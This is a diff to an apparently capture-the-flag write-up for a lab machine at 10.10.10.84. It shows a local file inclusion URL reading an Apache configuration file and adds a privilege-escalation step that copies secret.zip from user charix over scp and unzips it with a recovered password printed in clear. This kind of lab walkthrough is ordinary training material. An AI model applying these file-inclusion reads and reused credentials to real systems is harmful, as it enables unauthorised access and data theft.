@@ -72,6 +72,15 @@ Port 80: Apache httpd 2.4.29
 http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf
 ```
 
+## Privilege Escalation:
++ Transfer **secret.zip** to your kali attack vm.
++ `scp -P 22 charix@10.10.10.84:/home/charix/secret.zip .` with previous password `Charix!2#4%6&8(0`
++ unzip with the same password `Charix!2#4%6&8(0`: `unzip secret.zip`
++ There's no useful thing!
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4245b7b-e57c-496c-bf6b-08378b235a83)
+
++ 
 
 
 # References & Alternatives:
